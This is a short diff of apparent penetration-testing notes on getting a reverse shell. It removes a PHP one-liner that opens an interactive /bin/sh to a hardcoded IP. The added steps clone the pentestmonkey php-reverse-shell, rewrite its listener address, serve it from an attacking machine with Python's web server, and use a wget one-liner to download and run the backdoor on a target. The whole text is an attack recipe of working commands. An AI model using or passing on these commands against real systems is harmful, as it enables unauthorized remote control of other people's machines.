@@ -1,1 +1,16 @@
-php -r '$sock=fsockopen("173.17.0.157",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+# download the repository
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+
+# modify the source so it uses a listener's IP of choice
+cd php-reverse-shell
+sed -i 's/127.0.0.1/IPADDR/' php-reverse-shell.php
+
+# now the file is ready to be uploaded/downloaded onto the target
+# one method is to serve the backdoor from the attacking machine via python's builtin webserver: 
+python3 -m http.server
+# or
+python -m SimpleHTTPServer
+
+# then at the target, download and execute the backdoor
+# this one-liner can be used to download the php backdoor and execute it: 
+wget 192.168.1.14:/backdoor.php -O /tmp/backdoor.php && php -f /tmp/backdoor.php
